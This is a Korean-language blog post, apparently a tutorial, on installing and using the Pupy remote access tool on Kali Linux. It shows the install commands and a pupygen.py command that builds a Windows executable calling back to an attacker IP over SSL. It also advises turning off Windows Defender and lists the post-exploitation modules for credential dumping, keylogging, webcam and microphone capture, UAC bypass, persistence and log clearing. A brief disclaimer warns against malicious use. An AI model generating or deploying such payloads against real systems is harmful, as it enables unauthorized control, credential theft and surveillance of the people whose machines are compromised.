---
layout: post
title: ! "[Kali] PUPY 설치 및 사용법"
categories: [Kali]
excerpt: " "
comments: true
share: true
tags:
  - Kali Linux
  - Pupy
  - install
---

## 설치

### 환경 : Kali Linux,VMware Workstation 12 pro

참고 : https://github.com/n1nj4sec/pupy
```
git clone https://github.com/n1nj4sec/pupy.git pupy
cd pupy
git submodule init
git submodule update
pip install -r pupy/requirements.txt
wget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz
tar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates/ && rm payload_templates.txz && rm -r payload_templates
```

#### PUPY 설치
 1. git clone https://github.com/n1nj4sec/pupy.git
![]({{ site.baseurl }}/assets/posts/kali/pupy_git.png)
 2. cd pupy
 3. git submodule init
![]({{ site.baseurl }}/assets/posts/kali/pupy_init.png)

 4. git submodule update
![]({{ site.baseurl }}/assets/posts/kali/pupy_update.png)

 5. pip install -r pupy/requirements.txt

★설치가 안되거나 에러가 발생하는 경우 밑에 필요하다고 뜨는 것들을 설치해보면서 에러를 해결하시면 됩니다.


## 사용법
★공격자 ip는 ifconfig로 확인하시길 바랍니다.
![]({{ site.baseurl }}/assets/posts/kali/pupy_ifconfig.png)

```
./pupygen.py -O (타겟의 운영체제) -A (타겟의 아키텍쳐) -o (파일명.확장자) connect --host  (공격자 IP) --transport ssl 

./pupygen.py  -O windows -A x64 -o MitNy.exe  connect --host 000.000.000.000 --transport ssl
```

![]({{ site.baseurl }}/assets/posts/kali/pupy_gen.png)
저는 파일을 예전에 만들어놨고, VM이 아닌 제 컴퓨터에 직접 파일을 설치해놨었기 때문에 그것을 사용하겠습니다.(mitny.exe)
자신의 컴퓨터에 직접 테스트를 해보고싶으시면 Windows defender를 끄고 해보세요.
(절대 악의적인 목적으로 타인의 컴퓨터에 사용하지 마세요. 법적인 책임은 본인에게 있습니다.)

![]({{ site.baseurl }}/assets/posts/kali/pupy_mitny.png)


- pupysh.py 파일 실행

- 패스워드 입력 후 타겟 컴퓨터에서 위에서 만든 파일 실행 시 세션이 잡힘.

- sessions -i 1 -> Session 1이 타겟이 됨


![]({{ site.baseurl }}/assets/posts/kali/pupy_start.png)

`- info 입력시 타겟의 정보가 출력됨`

![]({{ site.baseurl }}/assets/posts/kali/pupy_info.png)

★ list_modules를 치면 사용 가능한 명령어 리스트를 볼 수 있습니다.

```
admin/beroot                 Windows Privilege Escalation
admin/clear_logs             Clear Event Logs
admin/dns                    Retrieve Domain Name From Ip And Vice Versa
admin/drives                 List Valid Drives In The System
admin/getdomain              Get Primary Domain Controller
admin/igd                    Upnp Igd Client
admin/interactive_shell      Open An Interactive Command Shell With A Nice Tty
admin/pexec                  Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen
admin/psexec                 Launch Remote Commands Using Smbexec Or Wmiexec
admin/psh                    Load/Execute Powershell Scripts
admin/pyexec                 Execute Python Code On A Remote System
admin/pyshell                Open An Interactive Python Shell On The Remote Client
admin/rdesktop               Start A Remote Desktop Session Using A Browser Websocket Client
admin/rdp                    Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host
admin/scapy_shell            Open An Interactive Python Shell On The Remote Client
admin/shares                 List Local And Remote Shared Folder And Permission
admin/shell_exec             Execute Shell Commands On A Remote System
admin/smb                    Copy Files Via Smb Protocol
admin/smbspider              Walk Through A Smb Directory And Recursively Search A String Into Files
admin/ssh                    Ssh Client
admin/zip                    Zip / Unzip File Or Directory
creds/changeme               Default Credential Scanner
creds/creddump               Download The Hives From A Remote Windows System And Dump Creds
creds/lazagne                Retrieve Passwords Stored On The Target
creds/loot_memory            Crawl Processes Memory And Look For Cleartext Credentials
creds/memstrings             Dump Printable Strings From Process Memory For Futher Analysis
exploit/exploit_suggester    Exploit Suggester
exploit/impersonate          List/Impersonate Process Tokens
exploit/mimikatz             Execute Mimikatz From Memory
exploit/shellcode_exec       Executes The Supplied Shellcode On A Client
gather/check_vm              Check If Running On Virtual Machine
gather/cloudinfo             Retrieve Ec2/Digitalocean Metadata
gather/get_hwuuid            Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)
gather/get_info              Get Some Informations About One Or Multiple Clients
gather/keylogger             A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)
gather/mouselogger           Log Mouse Clicks And Take Screenshots Of Areas Around It
gather/netcreds              Sniffs Cleartext Passwords From Interface
gather/outlook               Interact With Outlook Session Of The Targeted User
gather/powerview             Execute Powerview Commands
gather/pywerview             Rewriting Of Some Powerview'S Functionalities In Python
gather/record_mic            Record Sound With The Microphone !
gather/screenshot            Take A Screenshot :)
gather/search                Walk Through A Directory And Recursively Search A String Into Files
gather/users                 Get Interactive Users
gather/webcamsnap            Take A Webcam Snap :)
general/process_kill         Kill A Process
manage/download              Download A File/Directory From A Remote System
manage/duplicate             Duplicate The Current Pupy Payload By Executing It From Memory
manage/getprivs              Manage Current Process Privileges
manage/lock_screen           Lock The Session
manage/memory_exec           Execute A Executable From Memory
manage/migrate               Migrate Pupy Into Another Process Using Reflective Dll Injection
manage/persistence           Enables Persistence Via Registry Keys
manage/upload                Upload A File/Directory To A Remote System
network/forward              Local/Remote Port Forwarding And Socks Proxy
network/nbnsspoof            Sniff For Nbns Requests And Spoof Nbns Responses
network/port_scan            Run A Tcp Port Scan
network/portfwd              Perform Local/Remote Port Forwarding Using Openssh -L/-R Syntax
network/socks5proxy          Start A Socks5 Proxy Going Through A Client
network/tcpdump              Module To Reproduce Some Of The Classic Tcpdump Tool Functions
privesc/bypassuac            Try To Bypass Uac
privesc/getsystem            Try To Get Nt Authority System Privileges
privesc/inveigh              Execute Inveigh Commands
troll/msgbox                 Pop Up A Custom Message Box
```
